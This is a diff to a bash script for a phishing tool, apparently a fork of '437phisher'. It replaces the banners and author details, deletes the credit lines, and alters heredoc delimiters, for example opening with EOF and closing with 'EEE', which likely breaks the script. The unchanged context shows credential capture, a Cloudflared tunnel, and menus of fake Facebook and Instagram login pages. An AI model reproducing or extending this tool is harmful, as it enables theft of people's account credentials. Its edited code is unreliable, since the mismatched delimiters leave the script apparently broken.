@@ -1,14 +1,14 @@
 #!/bin/bash
 
-##   437phisher :       Automated Phishing Tool+
-##   Author 	: 	RenderBolt
+##   437phisher :   SYK Phishing Tool+
+##   Author 	: 	SYK
 ##   Version 	: 	1.0
-##   Github 	: 	https://github.com/RenderBolt96
+##   Github 	: 	https://github.com/SYK777SPIDEY777
 ## Modified version of :
-##   437phisher : 	Automated Phishing Tool
-##   Author 	: 	RenderBolt
+##   SPIDEY777 : 	SYK
+##   Author 	: 	SPIDEY
 ##   Version 	: 	1.2
-##   Github 	: 	https://github.com/RenderBolt96  
+##   Github 	: 	https://github.com/SYKKK
 
 
 
@@ -69,12 +69,12 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 		
-${CYAN}  _  _    ____  _____  ____   _      _       _                 
-${CYAN} | || |  |___ /|___  || '_ \ | |    (_)     | |                
-${CYAN} | || |_   |_ \   / / | |_) || |__   _  ___ | |__    ___  _ __ 
-${CYAN} |__   _| ___) | / /  | .__/ | '_ \ | |/ __|| '_ \  / _ \| '__|	
-${CYAN}    |_|  |____/ /_/   | |    | | | || |\__ \| | | ||  __/| |   	
-${CYAN}                      |_|    |_| |_||_||___/|_| |_| \___||_|   
+${CYAN} ███████╗██╗   ██╗██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
+${CYAN} ██╔════╝╚██╗ ██╔╝██║ ██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
+${CYAN} ███████╗ ╚████╔╝ █████╔╝        ██║   ██║   ██║██║   ██║██║     ███████╗
+${CYAN} ███████║   ██║   ██║  ██╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║                                                                        
+${CYAN} ╚══════╝   ╚═╝   ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
+${CYAN} ███████╗███████╗███████╗███████╗███████╗███████╗███████╗███████╗███████╗███████╗                                                                          
 ${CYAN} ${RED}Version : 1.0	${MAGENTA}Working Still
 
 ${RED}[${MAGENTA}-${RED}]${CYAN} The Title Will ONLY DISPLAY PROPERLY If The Screen Is Turned HORZONTALLY!!! ${WHITE}
@@ -86,14 +86,15 @@ EOF
 ## Small Banner
 banner_small() {
 	cat <<- "EOF"
-		 _       ____   _     .-"""-.   _       ____   _     
-		| |     / __ \ | |   / _   _ \ | |     / __ \ | |    
-		| |    | |  | || |   ](_' `_)[ | |    | |  | || |    
-		| |    | |  | || |   `-. N ,-' | |    | |  | || |    
-		| |___ | |__| || |___  |||||   | |___ | |__| || |___ 
-		|_____| \____/ |_____| `---'   |_____| \____/ |_____|
-		437Phisher----Respect Frogs----Version : 1.0
-	EOF
+   ███████╗██████╗ ██╗██████╗ ███████╗██╗   ██╗███████╗███████╗███████╗
+   ██╔════╝██╔══██╗██║██╔══██╗██╔════╝╚██╗ ██╔╝╚════██║╚════██║╚════██║
+   ███████╗██████╔╝██║██║  ██║█████╗   ╚████╔╝     ██╔╝    ██╔╝    ██╔╝
+   ╚════██║██╔═══╝ ██║██║  ██║██╔══╝    ╚██╔╝     ██╔╝    ██╔╝    ██╔╝ 
+   ███████║██║     ██║██████╔╝███████╗   ██║      ██║     ██║     ██║  
+   ╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝   ╚═╝      ╚═╝     ╚═╝     ╚═╝  
+                                                                    
+		777SPIDEY----SYK 88----Version : 1.0
+	EEE
 }
 
 ## Dependencies
@@ -137,7 +138,7 @@ dependencies() {
 }
 
 
-## Download Cloudflared
+## Download SYKFLARED
 download_cloudflared() {
 	url="$1"
 	file=`basename $url`
@@ -187,9 +188,9 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${MAGENTA}Author   ${RED}:  ${ORANGE}RenderBolt
-		${MAGENTA}Github   ${RED}:  ${CYAN}https://github.com/RenderBolt96
-		${MAGENTA}Social   ${RED}:  ${CYAN}https://bit.ly/AKSHAYARJUN
+		${MAGENTA}Author   ${RED}:  ${ORANGE}SYKTOOL
+		${MAGENTA}Github   ${RED}:  ${CYAN}https://github.com/SYK
+		${MAGENTA}Social   ${RED}:  ${CYAN}https://bit.ly/SYK
 		${MAGENTA}Version  ${RED}:  ${ORANGE}1.0
 
 		${REDBG}${WHITE} Thanks : htr-tech,Adi1090x,MoisesTapia,ThelinuxChoice
@@ -270,9 +271,6 @@ capture_data() {
 }
 
 
-## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
-## Credits HTR-TECH and AKSHAY-ARJUN
-
 ## Start Cloudflared
 start_cloudflared() { 
         rm .cld.log > /dev/null 2>&1 &
@@ -314,7 +312,7 @@ tunnel_menu() {
 
 ## Facebook
 site_facebook() {
-	cat <<- EOF
+	cat <<- SYK
 
 		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Traditional Login Page
 		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Advanced Voting Poll Login Page
@@ -350,7 +348,7 @@ site_facebook() {
 
 ## Instagram
 site_instagram() {
-	cat <<- EOF
+	cat <<- SYK
 
 		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Traditional Login Page
 		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Auto Followers Login Page
